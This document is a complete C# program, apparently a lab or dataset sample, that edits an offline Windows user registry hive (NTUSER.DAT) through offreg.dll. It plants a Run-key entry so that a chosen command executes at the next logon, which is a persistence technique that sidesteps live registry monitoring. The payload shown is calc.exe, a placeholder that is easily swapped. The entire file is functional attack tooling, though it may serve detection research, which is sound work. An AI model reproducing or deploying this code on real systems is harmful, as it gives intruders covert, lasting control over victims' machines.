using System;
using System.Runtime.InteropServices;

namespace RegistryOfflinePersistence
{
    class Program
    {
        // --- P/Invoke Definitions for offreg.dll ---
        private const string OffRegDll = "offreg.dll";

        // Constants
        private const uint REG_SZ = 1;
        private const uint ERROR_SUCCESS = 0;

        [DllImport(OffRegDll, CharSet = CharSet.Unicode, EntryPoint = "OROpenHive", CallingConvention = CallingConvention.Winapi)]
        private static extern uint OROpenHive(
            string lpszFilePath,
            out IntPtr phkResult
        );

        [DllImport(OffRegDll, CharSet = CharSet.Unicode, EntryPoint = "ORCreateKey", CallingConvention = CallingConvention.Winapi)]
        private static extern uint ORCreateKey(
            IntPtr hKey,
            string lpSubKey,
            string lpClass,
            uint dwOptions,
            IntPtr pSecurityDescriptor,
            out IntPtr phkResult,
            out uint pdwDisposition
        );

        [DllImport(OffRegDll, CharSet = CharSet.Unicode, EntryPoint = "ORSetValue", CallingConvention = CallingConvention.Winapi)]
        private static extern uint ORSetValue(
            IntPtr hKey,
            string lpValueName,
            uint dwType,
            byte[] lpData,
            uint cbData
        );

        [DllImport(OffRegDll, CharSet = CharSet.Unicode, EntryPoint = "ORSaveHive", CallingConvention = CallingConvention.Winapi)]
        private static extern uint ORSaveHive(
            IntPtr hKey,
            string lpszFilePath,
            uint dwOsMajorVersion,
            uint dwOsMinorVersion
        );

        [DllImport(OffRegDll, EntryPoint = "ORCloseKey", CallingConvention = CallingConvention.Winapi)]
        private static extern uint ORCloseKey(IntPtr hKey);

        static int Main(string[] args)
        {
            // Configuration variables matching your lab sample
            string targetHivePath = @"C:\Users\Public\NTUSER.DAT";
            string runKeyName = "Dataset_A06_1b_CSharp";
            string payloadCommand = @"C:\Windows\System32\calc.exe";
            string runKeySubPath = @"Software\Microsoft\Windows\CurrentVersion\Run";

            Console.WriteLine("[*] Initializing offline hive manipulation via offreg.dll...");

            IntPtr hRootKey = IntPtr.Zero;
            IntPtr hRunKey = IntPtr.Zero;

            try
            {
                // 1. Open the offline hive file from disk
                uint result = OROpenHive(targetHivePath, out hRootKey);
                if (result != ERROR_SUCCESS)
                {
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine($"[-] OROpenHive failed. Ensure the file exists and is not locked. Error code: {result}");
                    Console.ResetColor();
                    return 1;
                }

                // 2. Open or create the run key path inside the offline hive
                uint dwDisposition;
                result = ORCreateKey(hRootKey, runKeySubPath, null, 0, IntPtr.Zero, out hRunKey, out dwDisposition);
                if (result != ERROR_SUCCESS)
                {
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine($"[-] ORCreateKey failed with error code: {result}");
                    Console.ResetColor();
                    return 1;
                }

                // 3. Prepare the string data. C# strings are UTF-16, so we get the bytes 
                // and ensure we append a null terminator (\0).
                byte[] commandBytes = System.Text.Encoding.Unicode.GetBytes(payloadCommand + "\0");
                uint cbData = (uint)commandBytes.Length;

                // 4. Inject the persistence value into the offline tree structure
                result = ORSetValue(hRunKey, runKeyName, REG_SZ, commandBytes, cbData);
                if (result != ERROR_SUCCESS)
                {
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine($"[-] ORSetValue failed with error code: {result}");
                    Console.ResetColor();
                    return 1;
                }

                // 5. Serialize and save the changes back into the binary file
                // Using 6, 2 for Windows 7 / Windows Server 2008 R2 format as standard target compatibility
                result = ORSaveHive(hRootKey, targetHivePath, 6, 2);
                if (result != ERROR_SUCCESS)
                {
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine($"[-] ORSaveHive failed with error code: {result}");
                    Console.ResetColor();
                    return 1;
                }

                Console.ForegroundColor = ConsoleColor.Green;
                Console.WriteLine($"[+] Successfully created persistence inside offline hive at: {targetHivePath}");
                Console.ResetColor();
                return 0;
            }
            catch (DllNotFoundException)
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("[-] Critical Error: offreg.dll could not be found.");
                Console.WriteLine("[*] Ensure offreg.dll is in the same directory as your executable or in your PATH.");
                Console.ResetColor();
                return 1;
            }
            finally
            {
                // 6. Ensure clean-up occurs regardless of execution success
                if (hRunKey != IntPtr.Zero)
                {
                    ORCloseKey(hRunKey);
                }
                if (hRootKey != IntPtr.Zero)
                {
                    ORCloseKey(hRootKey);
                }
            }
        }
    }
}